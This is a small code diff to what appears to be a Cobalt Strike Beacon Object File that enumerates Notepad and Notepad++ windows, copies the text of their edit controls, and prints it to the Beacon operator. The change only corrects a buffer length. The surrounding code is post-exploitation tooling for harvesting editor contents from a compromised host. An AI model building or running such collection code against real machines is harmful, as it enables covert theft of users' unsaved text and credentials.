@@ -28,7 +28,7 @@ BOOL CALLBACK EnumWindowClasses(HWND hWndParent, LPARAM lParam)
 					return TRUE;														// control had no text to copy, keep looking
 			}
 			buffer = (char*)MSVCRT$calloc(1, len+1);									// add room for null termination
-			USER32$SendMessageA(hWndParent, WM_GETTEXT, len, (LPARAM)buffer);
+			USER32$SendMessageA(hWndParent, WM_GETTEXT, len+1, (LPARAM)buffer);
 			BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad++ Found: %s\n%s", WindowName, buffer);
 			MSVCRT$free(buffer);
 		}
@@ -53,7 +53,7 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
 				if (editHwnd) {
 					len = USER32$SendMessageA(editHwnd, WM_GETTEXTLENGTH, 0, 0);		// get the length of the control contents
 					buffer = (char*)MSVCRT$calloc(1, len+1);
-					USER32$SendMessageA(editHwnd, WM_GETTEXT,len,(LPARAM)buffer);
+					USER32$SendMessageA(editHwnd, WM_GETTEXT,len+1,(LPARAM)buffer);
 					BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad Found: %s\n%s\n", WindowName, buffer);
 					MSVCRT$free(buffer);
 				} else {
